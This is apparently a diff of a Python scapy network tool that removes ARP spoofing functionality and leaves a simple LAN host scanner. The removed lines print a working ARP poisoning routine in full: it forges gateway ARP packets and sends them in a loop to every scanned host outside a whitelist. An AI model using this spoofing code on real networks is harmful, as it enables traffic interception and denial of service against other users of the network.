@@ -5,7 +5,6 @@ import re
 from scapy.layers.l2 import Ether, ARP
 from multiprocessing import Process
 import time
-import random
 
 
 class ARP_Scan:
@@ -56,8 +55,7 @@ class ARP_Scan:
         """
         # 打印出局域网中的主机
         for ip, mac in self.result:
-            if (ip, mac) not in self.spoofList:
-                print("[*] IP: {} --- MAC: {}".format(ip, mac))
+            print("[*] IP: {} --- MAC: {}".format(ip, mac))
 
     @staticmethod
     def search_Interface():
@@ -67,72 +65,19 @@ class ARP_Scan:
         print("YOUR Interfaces :")
         print(show_interfaces())
 
-    def arpspoof(self):
-        for ip, mac in self.result:
-            if mac == scan.my_mac or ip in scan.whiteList or (ip, mac) in self.spoofList:
-                pass
-            else:
-                p = Process(target=process_run, args=(
-                    self.route_ip, self.my_mac, ip, mac,))
-                p.start()
-                self.spoofList.append((ip, mac))
-
-    def randomMAC(self):
-
-        mac = [0x00, 0x16, 0x3e,
-
-               random.randint(0x00, 0x7f),
-
-               random.randint(0x00, 0xff),
-
-               random.randint(0x00, 0xff)]
-
-        return ':'.join(map(lambda x: "%02x" % x, mac))
-
-
-def process_run(route_ip, my_mac, ip, mac):
-    print("\n[==>>] attack {:} {:}".format(ip, mac))
-    try:
-        eth = Ether(src=my_mac, dst=mac)
-        arp = ARP(
-            # op="is-at",  # ARP响应
-            op=1,
-            hwsrc=my_mac,  # 网关mac
-            psrc=route_ip,  # 网关IP
-            hwdst=mac,  # 目标Mac
-            pdst=ip  # 目标IP
-        )
-        # print((eth/arp).show())
-        sendp(eth/arp, inter=2, loop=1)
-    except Exception as f:
-        print("\n[ERROR]  {:}-{:} : {:}".format(ip, mac, f))
-
 
 if __name__ == "__main__":
     scan = ARP_Scan()
-    # scan.search_Interface() # 输出你的网卡信息
+    scan.search_Interface()  # 输出你的网卡信息
 
     target = "192.168.0.0/24"
-    # interface = "Killer(R) Wi-Fi 6 AX1650x 160MHz Wireless Network Adapter (200NGW)"
     interface = "Killer(R) Wi-Fi 6 AX1650x 160MHz Wireless Network Adapter (200NGW)"
-    scan.my_ip = "192.168.0.186"
-    scan.my_mac = "38:00:25:ab:e0:af"
-    scan.route_ip = "192.168.0.1"
-    scan.route_mac = ""
-
-    # 白名单
-    scan.whiteList = ["192.168.0.244", "192.168.0.149"]
-    scan.whiteList.append(scan.route_ip)
 
     # 开始扫描
-    while(True):
-        if target is not None:
-            scan.wifi = interface
-            scan.target = target
-            scan.send_Package(scan.target)
-            scan.print_Result()
-        else:
-            print("[E] 请输入您要扫描的网段")
-        # 开始arp_spoof
-        scan.arpspoof()
-        time.sleep(30)
+    if target is not None:
+        scan.wifi = interface
+        scan.target = target
+        scan.send_Package(scan.target)
+        scan.print_Result()
+    else:
+        print("[E] 请输入您要扫描的网段")
